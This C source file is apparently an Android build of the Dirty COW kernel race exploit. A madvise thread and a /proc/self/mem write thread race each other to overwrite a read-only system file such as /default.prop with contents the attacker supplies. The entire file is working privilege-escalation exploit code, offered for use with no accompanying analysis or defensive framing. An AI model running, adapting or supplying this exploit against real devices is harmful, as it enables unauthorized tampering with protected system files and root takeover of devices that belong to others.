#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...) 
#endif

unsigned char shellcode_buf[256] = { 0x90, 0x90, 0x90, 0x90 };

void hexdump(void const * data, unsigned int len)
{
  unsigned int i;
  unsigned int r,c;
  char outstr[20 + 4 * 16];

  if (!data)
    return;

  for (r=0,i=0; r<(len/16+(len%16!=0)); r++,i+=16)
  {
    char * curstr = outstr;
    char * const endstr = outstr + sizeof outstr;

    curstr += snprintf(curstr, endstr - curstr, "%p:   ", data + i); /* location of bytes */

    for (c=i; c<i+8; c++) /* left half of hex dump */
      if (c<len)
        curstr += snprintf(curstr, endstr - curstr, "%02X ",((unsigned char const *)data)[c]);
      else
        curstr += snprintf(curstr, endstr - curstr, "   "); /* pad if short line */
    
    curstr += snprintf(curstr, endstr - curstr, "  ");

    for (c=i+8; c<i+16; c++) /* right half of hex dump */
      if (c<len)
        curstr += snprintf(curstr, endstr - curstr, "%02X ",((unsigned char const *)data)[c]);
      else
        curstr += snprintf(curstr, endstr - curstr, "   "); /* pad if short line */

    curstr += snprintf(curstr, endstr - curstr, "   ");

    for (c=i; c<i+16; c++) /* ASCII dump */
      if (c<len)
        if (((unsigned char const *)data)[c]>=32 &&
            ((unsigned char const *)data)[c]<127)
          curstr += snprintf(curstr, endstr - curstr, "%c", ((char const *)data)[c]);
        else
          curstr += snprintf(curstr, endstr - curstr, "."); /* put this for non-printables */
      else
          curstr += snprintf(curstr, endstr - curstr, " "); /* pad if short line */

    curstr += snprintf(curstr, endstr - curstr, "\n");
    curstr = outstr;
    LOGV("%s", outstr);
  }
}


#define LOOP		0x100000
#define CHECK		0x1000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	off_t offset;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
	int do_patch;
};

static int check(struct mem_arg *mem_arg, const char *thread_name)
{
	/*unsigned char *check_patch = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;*/
	/*int i;*/
	/*for (i = 0; i < mem_arg->patch_size; i++) {*/
		/*if (*((unsigned char*)mem_arg->offset + i) != *(check_patch + i)) {*/
			/*return 1;*/
		/*}*/
	/*}*/
	return 0;
}

static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
	/*size = mem_arg->offset - (unsigned long)addr;*/
	size = mem_arg->patch_size + (mem_arg->offset - (unsigned long)addr);
	/*size = mem_arg->patch_size;*/
	/*addr = (void *)(mem_arg->offset);*/
	LOGV("[*] madvise = %p %d", addr, size);

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
		if (i % CHECK == 0 && check(mem_arg, __func__))
			break;
	}

	LOGV("[*] madvise = %d", c);
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		LOGV("open(\"/proc/self/mem\"");

	/*void *newp = malloc(mem_arg->patch_size);*/
	/*lseek(fd, mem_arg->offset, SEEK_SET);*/
	/*read(fd, newp, mem_arg->patch_size);*/
	/*hexdump(newp, 16);*/

	for (i = 0; i < LOOP; i++) {
		lseek(fd, mem_arg->offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);

		if (i % CHECK == 0 && check(mem_arg, __func__))
			break;
	}

	LOGV("[*] /proc/self/mem %d", c);

	close(fd);

	return NULL;
}

static int get_range(const char * library, unsigned long *start, unsigned long *end)
{
	char line[4096];
	FILE *fp;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL)
		LOGV("fopen(\"/proc/self/maps\")");

	while (fgets(line, sizeof(line), fp) != NULL) {
		if (strstr(line, library) == NULL)
			continue;

		if (strstr(line, "r-xp") == NULL)
			continue;

		*start = strtoul(line, NULL, 16);
		*end = strtoul(line+9, NULL, 16);
		fclose(fp);
		return 0;
	}

	fclose(fp);

	return -1;
}

static void exploit(struct mem_arg *mem_arg, int do_patch)
{
	pthread_t pth1, pth2;

	LOGV("[*] exploit (%s)", do_patch ? "patch": "unpatch");
	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->do_patch = do_patch;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

static unsigned long get_function_addr(const char * libname, const char * symbol)
{
	unsigned long addr;
	void *handle;
	const char *error;

	dlerror();

	handle = dlopen(libname, RTLD_LAZY);
	if (handle == NULL) {
		LOGV("%s", dlerror());
		exit(0);
	}

	addr = (unsigned long)dlsym(handle, symbol);
	error = dlerror();
	if (error != NULL) {
		LOGV("%s", error);
		exit(0);
	}

	dlclose(handle);

	return addr;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		LOGV("usage %s /default.prop /data/local/tmp/default.prop", argv[0]);
		return 0;
	}

	struct mem_arg mem_arg;
	struct stat st;
	struct stat st2;

	int f=open(argv[1],O_RDONLY);
	if (f == -1) {
		LOGV("could not open %s", argv[1]);
		return 0;
	}
	if (fstat(f,&st) == -1) {
		LOGV("could not open %s", argv[1]);
		return 0;
	}

	int f2=open(argv[2],O_RDONLY);
	if (f2 == -1) {
		LOGV("could not open %s", argv[2]);
		return 0;
	}
	if (fstat(f2,&st2) == -1) {
		LOGV("could not open %s", argv[2]);
		return 0;
	}

	if (st2.st_size != st.st_size) {
		LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st2.st_size, st.st_size);
	}
	size_t size = st2.st_size;
	LOGV("size %d\n\n",size);

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL)
		LOGV("malloc");

	mem_arg.unpatch = malloc(size);
	if (mem_arg.unpatch == NULL)
		LOGV("malloc");

  read(f2, mem_arg.patch, size);
  read(f, mem_arg.unpatch, size);

	mem_arg.patch_size = size;
	mem_arg.do_patch = 1;

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		LOGV("mmap");
		return 0;
	}
	close(f);
	close(f2);

	LOGV("[*] mmap %p", map);

	mem_arg.offset = (off_t)map;

	exploit(&mem_arg, 1);

	// to put back
	/*exploit(&mem_arg, 0);*/

	return 0;
}